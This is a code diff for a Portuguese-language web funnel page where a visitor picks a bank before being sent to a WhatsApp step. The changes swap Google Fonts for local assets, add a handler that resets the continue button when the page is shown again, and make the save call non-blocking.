@@ -8,9 +8,6 @@
     <script src="assets/js/ref-guard.js"></script>
     <script src="assets/js/tailwind.js"></script>
     <link href="assets/css/inter.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <script src="assets/js/funnel.js"></script>
     <style>
         body {
@@ -508,6 +505,17 @@
             }
         }
 
+        function resetFormState() {
+            const btn = document.getElementById('btnAvancar');
+            if (btn && selectedBankName) {
+                btn.disabled = false;
+                btn.innerText = 'CONTINUAR';
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+        }
+
+        window.addEventListener('pageshow', resetFormState);
+
         async function avancar() {
             if (!selectedBankName) return;
 
@@ -516,7 +524,7 @@
             btn.innerText = 'Processando...';
 
             sessionStorage.setItem('user_banco', selectedBankName);
-            await saveFunnelData('banco', { banco: selectedBankName });
+            saveFunnelData('banco', { banco: selectedBankName });
 
             // Próxima etapa do funil: WHATSAPP
             navTo('whatsapp.html');
